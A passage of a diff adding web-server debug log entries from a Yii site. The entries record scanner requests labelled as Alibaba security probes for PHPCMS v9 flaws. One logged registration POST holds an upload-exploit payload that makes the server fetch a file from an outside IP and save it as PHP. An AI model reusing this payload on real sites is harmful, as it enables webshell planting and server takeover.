+    'modelid' => '11'
+    'username' => 'hXQMmrta'
+    'password' => 'hXQMmrta'
+    'email' => 'hXQMmrta@aliyun.com'
+    'info' => [
+        'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>'
+    ]
+    'dosubmit' => '1'
+    'protocol' => ''
+]
+
+$_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => 'm=member&c=index&a=register&siteid=1'
+    'REQUEST_METHOD' => 'POST'
+    'CONTENT_TYPE' => 'application/x-www-form-urlencoded'
+    'CONTENT_LENGTH' => '171'
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/index.php?m=member&c=index&a=register&siteid=1'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.201.33'
+    'REMOTE_PORT' => '56676'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_ACCEPT_ENCODING' => 'identity'
+    'HTTP_CONTENT_LENGTH' => '171'
+    'HTTP_HOST' => 'www.mxker.cn:80'
+    'HTTP_CONTENT_TYPE' => 'application/x-www-form-urlencoded'
+    'HTTP_CONNECTION' => 'close'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499928326.3264
+    'REQUEST_TIME' => 1499928326
+]
+2017-07-13 14:46:21 [140.205.201.33][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.201.33
+    in /edu/frontend/views/layouts/main.php:158
+    in /edu/frontend/controllers/SiteController.php:32
+2017-07-13 14:46:20 [140.205.201.33][-][-][info][application] $_GET = [
+    'm' => 'wap'
+    'a' => 'index'
+    'siteid' => '1'
+]
+
+$_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => 'm=wap&a=index&siteid=1'
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/index.php?m=wap&a=index&siteid=1'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.201.33'
+    'REMOTE_PORT' => '10762'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_ACCEPT_ENCODING' => 'identity'
+    'HTTP_HOST' => 'www.mxker.cn:80'
+    'HTTP_CONNECTION' => 'close'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499928380.9887
+    'REQUEST_TIME' => 1499928380
+]
